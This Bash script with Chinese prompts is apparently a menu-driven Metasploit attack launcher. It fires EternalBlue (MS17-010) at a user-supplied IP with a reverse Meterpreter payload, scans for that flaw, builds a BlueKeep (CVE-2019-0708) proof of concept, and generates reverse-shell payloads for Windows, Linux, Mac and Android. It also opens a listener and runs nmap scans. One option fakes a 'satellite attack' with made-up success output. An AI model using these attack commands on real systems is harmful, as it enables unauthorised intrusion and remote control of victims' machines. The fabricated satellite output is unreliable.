#【作者】CatGames
Initialization_Tools(){
	clear
	echo -e "\e[31m|***CatGAmes自动化攻击工具初始化中..."
	echo -ne '\033[32m[#####                 ](22%)\r'
	sleep 2
	echo -ne '\033[35m[#########             ](55%)\r'
	sleep 2
	echo -ne '\033[33m[#############         ](66%)\r'
	sleep 2
	echo -ne '\033[34m[######################](100%)\r'
	sleep 2
	clear
	echo -ne '\n'

}
CatGames_LoGo(){
	echo -e " _____       ___   _____   _____       ___       ___  ___   _____   _____  
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/ 
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___  
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___  \ 
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| | 
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/ 
        "
echo -e "By_CatGamesGa0"
}
CatGames_CLT(){
	echo -e "\e[97m                      ______
                   .-        -.
                  /            \               by CatGamesGa0
     \e[94m* \e[97m                   \e[90m* \e[97m
                 |,  .-.  .-.  ,|        \e[32m* \e[97m
                 | )(_ /  \_ )( |
                 |/     /\     \|    \e[34m* \e[97m
       (@_       <__    ^^    __>         \e[95m* \e[97m
  _     ) \_______\__|IIIIII|__/____________\e[31m___________ \e[97m
 (_)\e[31m@8@8\e[97m{}<________\e[31m_____\e[97m_____________\e[31m___________________> \e[97m
        )_/         \ IIIIII /                    \e[31m::::: \e[97m
       (@            --------                        \e[31m:: \e[97m
        "
echo -e "\n"
}
CatGames_China_No-1(){
		echo -e " \e[31m_____   _   _   _   __   _       ___        __   _   _____        ___  
\e[31m/  ___| | | | | | | |  \ | |     /   |      |  \ | | /  _  \      |_  | 
\e[31m| |     | |_| | | | |   \| |    / /| |      |   \| | | | | |        | | 
\e[31m| |     |  _  | | | | |\   |   / / | |      | |\   | | | | |        | | 
\e[31m| |___  | | | | | | | | \  |  / /  | |      | | \  | | |_| |        | | 
\e[31m\_____| |_| |_| |_| |_|  \_| /_/   |_|      |_|  \_| \_____/        |_| 

        "
}
Initialization_Tools
echo -e "\E[1;31m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;31m:::::::::::::::"
echo -e "\E[1;31m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;31m:::::::::::::::"
CatGames_LoGo
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "初始化完成,按下【回车】开始！"
clear
eternalblue_AuToExP(){
echo -e "\E[1;33m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;33m:::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
CatGames_CLT
echo -e "\E[1;33m:::::::::::::: \e[97m自动执行永恒之蓝攻击 \E[1;33m:::::::::::::::"
#需要用户输入需要攻击的IP地址
read -p "请输入对方IP地址：" IPAdd;  
read -p "请输入本机IP地址：" IPme;
#设置Eternalblue攻击模块
#设置Payload 反弹Meterpreter
#设置RHOSTS 为Hacker（JB小子）输入的攻击IP地址 PRORT 445
#设置LHOST 反弹地址（本机地址）反弹端口设置为4444
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
set payload windows/x64/meterpreter/reverse_tcp;
set RHOSTS $IPAdd;set RPORT 445;
set LHOST $IPme;set LPORT 4444;run"

}
eternalblue_AuTo_Auxiliary(){
	echo -e "\E[1;33m:::::::::::::: \e[97mMsf自动执行攻击脚本 \E[1;33m:::::::::::::::"
	echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
	CatGames_LoGo	
	echo -e "\E[1;33m:::::::::::::: \e[97m自动执行永恒之蓝漏洞扫描 \E[1;33m:::::::::::::::"	
	#设置需要扫描的IP地址范围是多少 传给$IPALL
	read -p "请输入需要扫描的IP地址范围：" IPALL;
	read -p "请输入需要设置的扫描线程（默认1）：" thread;
	#设置永恒之蓝扫描模块
	##设置RHOSTS $IPALL接受用户输入值 设置端口为445
	msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010;
	set RHOSTS $IPALL;set RPORT 445;set threads $thread;run;"
}
echo -e "\E[1;33m:::::::::::::: \e[97mCatGamesGa0自动执行攻击脚本 \E[1;33m:::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97m攻防无绝对|技术无黑白 \E[1;33m:::::::::::::::"
CatGames_LoGo
echo -e "\033[31m请输入需要使用的功能！"
echo -e "\033[33m[1]使用永恒之蓝攻击模块"
echo -e "\033[32m[2]使用永恒之蓝扫描模块"
echo -e "\033[34m[3]使用CVE-2019-0708-POC"
echo -e "\033[35m[4]一键日卫星"
echo -e "\033[36m[5]设置Payload"
echo -e "\033[37m[6]Nmap扫描"
#echo -e "[7]SET社会工程"
echo -e "\033[31m[7]Msf监听IP与端口"
echo -e "\033[33m[8]关于"
read -p "请输入您需要执行的功能(回车退出）：" Num

Nmap_ALL(){
	clear
	CatGames_LoGo
	echo -e "[1]获取远程主机的系统类型及开放端口"
	echo -e "[2]在网络寻找所有在线主机"
	echo -e "[3]Ping 指定范围内的 IP 地址"
	echo -e "[4]获取主机系统类型"
	echo -e "[5]指定端口扫描"
	echo -e ""
	read -p "请输入您需要执行的功能(回车退出）：" Nmap
	case $Nmap in "1" | "1" )
	clear
	CatGames_LoGo
	read -p "请输入需要扫描的IP地址：" Nmap_IP
	nmap -sS -P0 -sV -O $Nmap_IP
		;;
	"2" | "2" )	
	clear
	CatGames_LoGo
	read -p "请输入需要寻在在线主机的IP段(例:192.168.0.0/24)：" Nmap_IIP
	nmap -sP $Nmap_IIP
	;;
	"3" | "3" )
	clear
	CatGames_LoGo
	read -p "请输入你需要指定Ping的IP地址范围(例:192.168.1.100-254)：" Nmap_IIIP
	nmap -sP $Nmap_IIIP
	;;
	"4" | "4" )
	clear 
	CatGames_LoGo
	read -p "请输入需要获取主机类型的IP地址：" Nmap_IIIIP
	nmap -O $Nmap_IIIIP
	;;
	"5" | "5" )
	clear
	CatGames_LoGo
	read -p "请输入端口号：" Nmap_PORT
	read -p "请输入IP地址：" Nmap_IIIIIP
	nmap -p $Nmap_PORT $Nmap_IIIIIP
	esac
	exit

}
Get_Payload(){
	clear
	CatGames_LoGo
	echo -e "[1]Windows"
	echo -e "[2]Linux"
	echo -e "[3]Mac"
	echo -e "[4]Android"
	read -p "选择Payload针对类型:" Payload_1
	case $Payload_1 in "1" | "1" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f exe > /$Me_MuLu/CatGames_Payload.exe
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.exe"
	;;	
	"2" | "2" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f elf > /$Me_MuLu/CatGames_Payload.elf
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.elf"
	;;
	"3" | "3" )
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	msfvenom -p osx/x86ell_reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f macho > /$Me_MuLu/CatGames_Payload.macho
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.macho"
	;;
	"4" | "4" )
	echo -e "text"
	read -p "请输入反弹IP：" MeIP
	read -p "请输入反弹端口：" Me_Port
	read -p "请输入Payload输出目录(例：tmp)：" Me_MuLu
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port R > /$Me_MuLu/CatGames_Payload.apk
	echo -e "Payload生成目录在/$Me_MuLu/CatGames_Payload.apk"
	;;
	esac
	exit
}


case $Num in "1" | "1" )
	clear
	eternalblue_AuToExP
		;;
	"2" | "2" )	
	clear
	eternalblue_AuTo_Auxiliary
	;;
	"3" | "3" )
	git clone https://github.com/zerosum0x0/CVE-2019-0708.git
	cd CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/
	apt-get install dh-autoreconf
	apt-get install libssl-dev
	./bootstrap
	./configure --disable-credssp --disable-smartcard
	make
	read -p "请输入对方IP以及端口（3389）：" IPPOC;
	./rdesktop $IPPOC
	;;
	"4" | "4" )
	read -p "请输入需要攻击哪个国家的卫星（目前支持美国）:" satellite;
	echo -e "您选择的是[$satellite]的卫星 "
	read -p "请选择攻击成功后卫星掉落地点:" place;
	echo -e "您选择的卫星坠落地点是[$place]"
	int=1
	while(( $int<=5 ))
	do
    echo -e "请等待$int秒"
    echo -e "攻击反馈：已突破防火墙，已执行溢出，EXP攻击成功！"
    let "int++"
	done
	echo -e "攻击成功，美国一颗卫星已经坠落在$place,做得好hACKER(JB小子）"
	CatGames_China_No-1
	echo -e "\n"
	echo -e ""
	;;
	"5" | "5" )
	Get_Payload
	;;
	"6" | "6" )
	Nmap_ALL
	;;
	#"7" | "7" )
	#SET_TOOLS
	#;;
	"7" | "7" )
	clear
	CatGames_LoGo
	read -p "请输入监听IP：" JTIP
	read -p "请输入监听端口：" JTPROT
	msfconsole -x "use exploit/multi/handler;
	set PAYLOAD windows/meterpreter/reverse_tcp;
	set LHOST $JTIP;set PROT $JTPROT;run;"
	;;
	"8" | "8" )
	clear
	echo -e "感谢Cimoom_曲云杰的指点"
	sleep 2
	echo -e "感谢WRS戏子的指点"
	sleep 2
	echo -e "\033[5;31m _____       ___   _____   _____       ___       ___  ___   _____   _____  
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/ 
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___  
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___  \ 
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| | 
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/  \033[0m"
	echo -e "By_CatGamesGa0"
	;;
esac
	exit


